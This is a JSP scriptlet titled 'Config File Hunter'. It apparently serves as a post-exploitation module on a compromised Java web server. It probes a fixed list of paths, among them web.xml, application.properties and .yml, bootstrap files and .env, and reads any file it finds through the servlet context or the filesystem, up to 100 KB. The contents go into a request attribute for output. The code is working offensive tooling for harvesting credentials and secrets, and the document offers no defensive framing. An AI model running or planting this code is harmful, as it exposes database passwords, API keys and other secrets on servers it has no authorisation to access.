<%
String[] pathsToCheck = {
    "/WEB-INF/web.xml",
    "/WEB-INF/classes/application.properties",
    "/WEB-INF/classes/application.yml",
    "/WEB-INF/classes/bootstrap.properties",
    "/WEB-INF/classes/bootstrap.yml",
    "/WEB-INF/classes/config.properties",
    "/.env",
    "/WEB-INF/classes/.env",
    "/application.properties",
    "/config/application.properties"
};

StringBuilder output = new StringBuilder();

try {
    output.append("[+] Config File Hunter\n");
    output.append("[+] Scanning common config paths...\n\n");

    for (String path : pathsToCheck) {
        output.append("Checking: ").append(path).append(" ... ");
        
        java.io.InputStream is = application.getResourceAsStream(path);
        if (is != null) {
            output.append("FOUND\n");
            try {
                byte[] buffer = new byte[8192];
                int n;
                int totalRead = 0;
                int maxRead = 100 * 1024; // 100 KB max
                while (totalRead < maxRead && (n = is.read(buffer)) != -1) {
                    output.append(new String(buffer, 0, n, "UTF-8"));
                    totalRead += n;
                }
                if (totalRead >= maxRead) {
                    output.append("\n[!] File truncated (max 100 KB)\n");
                }
            } catch (Exception e) {
                output.append("ERROR reading file: ").append(e.toString()).append("\n");
            } finally {
                try { is.close(); } catch (Exception e) {}
            }
        } else {
            try {
                String realPath = application.getRealPath(path);
                if (realPath != null) {
                    java.io.File f = new java.io.File(realPath);
                    if (f.exists() && f.canRead()) {
                        output.append("FOUND (filesystem)\n");
                        java.nio.file.Path p = f.toPath();
                        long size = java.nio.file.Files.size(p);
                        if (size > 100 * 1024) {
                            output.append("[!] File too large (").append(size).append(" bytes) - skipping content\n");
                        } else {
                            String content = new String(java.nio.file.Files.readAllBytes(p), "UTF-8");
                            output.append(content);
                        }
                    } else {
                        output.append("not found\n");
                    }
                } else {
                    output.append("not found\n");
                }
            } catch (Exception e) {
                output.append("not found\n");
            }
        }
        output.append("\n");
    }

} catch (Exception e) {
    output.append("ERROR: Config hunt failed - ").append(e.toString()).append("\n");
}

request.setAttribute("script_output", output.toString());
%>
